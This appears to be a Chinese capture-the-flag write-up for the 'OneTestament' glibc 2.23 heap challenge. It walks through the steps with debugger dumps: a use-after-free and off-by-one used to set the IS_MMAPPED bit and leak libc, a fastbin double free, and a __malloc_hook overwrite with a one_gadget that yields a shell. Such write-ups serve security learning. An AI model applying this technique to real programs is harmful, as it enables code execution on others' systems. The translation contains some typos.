@@ -1,0 +1,203 @@
+我刚才已经找到了一些漏洞，其中的`double free`似乎是最重要的线索。更重要的是，在Glibc
+2.23种使用`fastbins`攻击利用`double free`是非常简单的。然而，ASLR和PIE是开启的，似乎需要强制使用了地址泄露。
+事实上，有一种方式不需要地址泄露也能攻击Glibc 2.23，这种技术叫做[House of
+Roman](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_roman.c).
+但是，这种攻击技术需要能够覆盖部分指针，和更多的分配内存。所以一定有漏洞在某些地方，我们深入挖掘看看。
+### Calloc与chunks元数据
+经过查看伪代码后，唯一发现可能泄露的地方是`new_testaments()`末尾的`printf()`。
+    [...]
+    testament_addr = calloc(nmemb, 1uLL);
+    if ( !testament_addr )
+      abort("Oops! Memory error");
+    printf("Please enter your testatment content: ");
+    fill_testament(0, (char *)testament_addr, nmemb);
+    for ( i = 0LL; i  10 )
+      abort("still too many testaments");
+    testaments[i] = testament_addr;
+    printf("My new testament: %s\n", (const char *)testament_addr);
+    [...]
+但是，这个函数必须要`calloc()`之后调用，意味着分配的内存已经被清空。
+查找文档 [source code of
+__libc_calloc](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3259)
+的源代码后发现，在某些特殊的情况下，`memset()`没有被调用，也就是内存区域没有被清空。
+    /* Two optional cases in which clearing not necessary */
+    if (chunk_is_mmapped (p))
+      {
+        if (__builtin_expect (perturb_byte, 0))
+          return memset (mem, 0, sz);
+        return mem;
+      }
+这通常是因为内存区域被分配给有效的chunk块时，并且设置了它的`IS_MMAPPED`位。
+    // From malloc/malloc.c
+    /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
+    #define IS_MMAPPED 0x2
+    /* check for mmap()'ed chunk */
+    #define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
+在x64架构上，malloc chunk块前面是8字节的元数据。它们包含了chunk size，和一些flag标志：
+`| CHUNK SIZE | A (0x4) | M (0x2) | P (0x1) |`
+  * A：分配区域，即程序的堆使用的主要区域
+  * M：`IS_MMAPPE`，这个chunk是通过对`mmap`的一次调用分配的，不是heap堆的一部分
+  * P：Previous 之前的chunk正在使用中
+举例来说，创建两个大小为0x90的testaments遗嘱会产生以下数据块：
+这里我们可以看到只有 **PREV_IN_USE** 位是被设置好的（0x90 & 0x1）。
+这里的目标是手动设置`IS_MMAPPE`位，以便在分配chunk时内存不会被清楚，并且我可能通过创建新的`testament`泄露地址。
+### 使用后免费（UAF）—逆向工程
+看起来是巧合，实则不是，这个`edit_testament()`函数允许我增加一个字节2次。如果已经设置了`PREV_IN_USE`，那么已经足够开启`IS_MMAPPED`位了。更重要的是，不用检查想要的编辑的`testament`遗嘱是否已经释放，因为有了UAF。
+问题是检查我们输入之后的偏移量`offset`的优先级并不高于`size_testament`。
+事实上，这并不能阻挡我成为而变成真正的问题，学会下面的方法，可以允许我打破chunk的元数据。
+  * 分配一个大小大于0x58的chunk，和一个小的chunk避免在freed释放大块chunk时合并。
+  * 释放分配的大块chunk，以使其在未排序的bin中结束。
+注意，此时一些libc的指针出现在释放的chunk块中，这是因为未排序的chunk是在一个循环链表中维护的。
+这些指针指向`main_area()`，里面包含不同的堆指针。
+    pwndbg> x/6xg 0x00007ffff7dd1b78
+    0x7ffff7dd1b78 :         0x00005555556050b0      0x0000000000000000
+    0x7ffff7dd1b88 :        0x0000555555605000      0x0000555555605000
+    0x7ffff7dd1b98 :        0x00007ffff7dd1b88      0x00007ffff7dd1b88
+  * 分配一个小的chunk来减小未排序的bin。
+因为testament指针和大小都存储在全局变量中，所以应该有两个testament指针指向同一个chunk。
+    pwndbg> x/3xg 0x555555603160 // testaments
+    0x555555603160: 0x0000555555605010      0x00005555556050a0
+    0x555555603170: 0x0000555555605010
+    pwndbg> x/3xw 0x555555603120 // size_testaments
+    0x555555603120: 0x0000007c      0x00000018      0x00000018
+有趣的事情是`size_testament[0]`的大小等于0x7c（大chunk的前一个大小），它比当前chunk`0x555555605010
+(0x20)`的大小大很多。我可以调用`edit_testament()`函数，大小的检查会被跳过，允许我们创建一个1个字节溢出当前的边界。
+这样，通过设置`IS_MMAPPED`位，可以在chunk的后面的元数据增加两次。
+    ==========================
+         ✝ OneTestament ✝      
+    ==========================
+    1. My new testament
+    2. Show my testament
+    3. Edit my testament
+    4. Delete my testament
+    5. Bye!
+    Please enter your choice: 3
+    Please enter your testament index: 0
+    Please enter your testament content: 24
+识别到24作为testament内容时，会在`testament numbe`r开始的地方创建第24个字节。
+现在使用pwndbg验证`IS_MMAPPED`是被设置好了。
+现在，下一个分配指针应该返回一个指向未排序的bin的指针，不清楚它的内容，并由于`printf(testament_addr)`而泄露它的地址。
+    $ python3 solve.py
+    [+] Starting local process './ontestament.bin_patched': pid 12633
+    [+] libc leak: 0x7ffff7dd1b00
+    [*] Stopped process './ontestament.bin_patched' (pid 12633)
+## 4.二次Free Fastbin Exploit—逆向工程
+我得到了泄漏的libc地址，每一件事情都变得非常容易。 剩下非常详细的利用技巧广泛的在互联网上存在，所以接下来是。
+计划是攻击两次free是为了包含在二进制地址中的一个chunk，一种非常有效的的方式来攻击这种类型的漏洞，需要通过写一个gadget小工具编写指向malloc的hook钩子。然后，下一步malloc()将会执行gadget小工具，获取我们需要的shell。
+为了达到这么做的目的，接下来需要的步骤：
+  * 通过之前使用的泄漏的地址来计算libc的基地址。
+  * 二次Free Fastbin 攻击利用
+  * 中哀悼一个合适的gadget
+  * 写入__mallon_hook
+  * 通过调用malloc()触发一个gadget
+  * 成功
+### 编写gadget和malloc hook
+一个[one
+gadget](https://github.com/david942j/one_gadget)工具可以调用`execve("/bin/sh",NULL,NULL)`，目前的大多数GLIBC版本都存在。
+    $ one_gadget libc.so.6
+    0x45226 execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      rax == NULL
+    0x4527a execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      [rsp+0x30] == NULL
+    0xf03a4 execve("/bin/sh", rsp+0x50, environ)
+    constraints:
+      [rsp+0x50] == NULL
+    0xf1247 execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+      [rsp+0x70] == NULL
+第二步被保持下来，因为在程序的执行流程中条件已经满足。
+`__malloc_hook`的地址可以用工具gdb找到，偏移量需要根据泄漏情况来适应。`__memalign_hook`是一个用于拦截`memalign`函数的hook，这些hook可以被用于在程序中进行一些额外的操作，例如内存泄漏检测或内存污染检测。
+    pwndbg> p &__malloc_hook
+    $1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 
+因为我要创建一个假的chunk块，在我们的地址之前的字节需要嗲表一个个有效的大小，否则当程序试图malloc是会崩溃。
+    pwndbg> x/64xg &__malloc_hook - 4
+    0x7ffff7dd1af0 :   0x00007ffff7dd0260      0x0000000000000000
+    0x7ffff7dd1b00 :       0x00007ffff7a92ea0      0x00007ffff7a92a70
+    0x7ffff7dd1b10 : 0x0000000000000000      0x0000000000000000
+我也不能选择`__malloc_hook`作为我的假的chunk地址，因为0x7ffff7a92a70在这个程序中不是一个有效的大小。然而，我可以在`&__malloc_hook
+- 0x23`中创建一个假的chunk，因为0x7f是有效的大小。
+这个命令是在pwndbg调试器中使用的，它使用了x/64xg命令来以十六进制格式显示从地址0x7ffff7dd1b10 -0x23开始的64个地址的内容，结果显示了64个地址的内容，每行显示了8个地址。每个地址的内容以16进制格式显示，每个地址的大小为8字节。
+    pwndbg> x/64xg 0x7ffff7dd1b10 - 0x23
+    0x7ffff7dd1aed :   0xfff7dd0260000000      0x000000000000007f
+    0x7ffff7dd1afd: 0xfff7a92ea0000000      0xfff7a92a7000007f
+这乍一看，似乎操作有些问题，因为地址没对齐，但是在glibc 2.23中这不是问题。
+我只需要知道要写入什么和写入地址，现在开始做。
+我通过定位2个小的chunk块以便第五个被使用，然后我释放`testament number
+5`第一次。因为libc会检查是否连续两次释放同一个chunk，所以我需要嵌入另一个free。
+然后，我就可以触发1个字节的溢出，这样就可以重置 is_testament_5_freed
+变量（在下面的示例中位置是0x5555556030b8），只需要在程序的主菜单简单的输入5个字符。
+第一次释放5号testament后，0x5555556030b8 保存在 0x0。
+    pwndbg> x/2xw 0x5555556030B4
+    0x5555556030b4: 0x00000a34      0x00000000
+触发一字节的溢出后：
+    pwndbg> c
+    ==========================
+         ✝ OneTestament ✝      
+    ==========================
+    1. My new testament
+    2. Show my testament
+    3. Edit my testament
+    4. Delete my testament
+    5. Bye!
+    Please enter your choice: 12345
+    Wrong choice !
+    pwndbg> x/2xw 0x5555556030B4
+    0x5555556030b4: 0x3433320a      0x00000035
+在地址0x5555556030B4处查看内存的结果，x/2xw表示以16进制格式显示两个32位字。结果显示的内容是两个32位字，分别为0x3433320a和0x00000035，存储的数据可能是一个字符串或一个整数。
+这使得我可能通过delete_testament()的校验，并第二次释放5号testament，这样会在fastbins中创建一个循环的效果显示。
+    pwndbg> fastbins
+    fastbins
+    0x20: 0x0
+    0x30: 0x0
+    0x40: 0x0
+    0x50: 0x0
+    0x60: 0x0
+    0x70: 0x5555556050b0 —▸ 0x555555605120 ◂— 0x5555556050b0
+    0x80: 0x0
+现在我需要创建一个大小为0x70的testament，里面可以保存下一步的假的chunk的地址，只需要出现在`__malloc_hook`的前面。
+    pwndbg> fastbins
+    fastbins
+    0x20: 0x0
+    0x30: 0x0
+    0x40: 0x0
+    0x50: 0x0
+    0x60: 0x0
+    0x70: 0x555555605120 —▸ 0x5555556050b0 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000
+    0x80: 0x0
+下一步，我创建两个大小为0x70的chunks，因为需要弹出到fastbins的链接列表中。
+    pwndbg> fastbins
+    fastbins
+    0x20: 0x0
+    0x30: 0x0
+    0x40: 0x0
+    0x50: 0x0
+    0x60: 0x0
+    0x70: 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000
+    0x80: 0x0
+最后的话，我就可以通过创建一个新的`testament`来重新分配我的假chunk块，然后利用工具one gadeets 把地址放在内存中。（
+**0x7ffff7a5227a** 在当前上下文中。）
+    pwndbg> x/8xg 0x7ffff7dd1b10-0x20
+    0x7ffff7dd1af0 :   0x00007ffff7dd0260      0x0000000000000000
+    0x7ffff7dd1b00 :       0x0000000000000000      0x0000000000000000
+    0x7ffff7dd1b10 : 0x00007ffff7a5227a      0x000000000000000a
+    0x7ffff7dd1b20 :    0x0000000000000000      0x0000000000000000
+最后的得到shell的必须做的一件事情就是触发`__malloc_hook`的执行流程，只需要利用一个新的`malloc`调用。
+    ==========================
+         ✝ OneTestament ✝      
+    ==========================
+    1. My new testament
+    2. Show my testament
+    3. Edit my testament
+    4. Delete my testament
+    5. Bye!
+    Please enter your choice: $ 1
+    ---------------------------------------      Which testament do you want to create:   
+    ----------------------------------------       1. Testament for your pet            
+       2. Testament for your parent         
+       3. Testament for your child          
+       4. Testament for your lover          
+    Please enter your choice: $ 3
+    $ cat flag
+    INS{0ld_7r1ck5_4r3_7h3_b357}
